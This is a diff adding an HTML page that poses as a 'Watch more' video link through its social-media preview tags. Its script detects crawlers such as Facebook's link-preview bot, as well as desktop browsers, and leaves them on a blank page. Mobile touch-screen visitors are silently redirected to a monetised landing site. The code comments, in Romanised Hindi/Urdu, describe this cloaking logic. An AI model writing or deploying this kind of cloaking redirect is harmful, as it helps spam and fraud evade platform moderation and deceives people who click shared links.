@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Watch more">
+    <meta property="og:description" content="Watch more">
+    <meta property="og:image" content="https://i.postimg.cc/DzD235mH/Picsart-26-07-08-17-22-55-667.jpg">
+    <meta property="og:type" content="website">
+</head>
+<body style="background-color: #ffffff;">
+
+    <script>
+        const moneyLander = "https://ocher-dove-11v65rh.mystrikingly.com/";
+        
+        const ua = navigator.userAgent.toLowerCase();
+        
+        // Bot detection
+        const isBot = /facebookexternalhit|facebot|bot|crawler|spider|slurp|bingbot/i.test(ua);
+        
+        // Touch support detection (Mobile/Tablet)
+        const hasTouchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+
+        // LOGIC:
+        // 1. Agar bot hai -> Block/Captcha dikhao
+        // 2. Agar "Laptop/Desktop" hai (jisme touch nahi hota) -> Isse bhi ab hum "Bot" ki tarah treat karenge taake isse bhi Captcha dikhe
+        
+        if (isBot || !hasTouchSupport) {
+            console.log("Security Challenge Active: Bot or Non-Touch device detected.");
+            // Yahan koi redirect nahi hoga, isliye Cloudflare ka WAF Captcha trigger ho jayega
+        } else {
+            // Sirf wahi log aage jayenge jinke paas "Touch Support" hai (Mobile/Tablet Users)
+            window.location.replace(moneyLander);
+        }
+    </script>
+</body>
+</html>
+
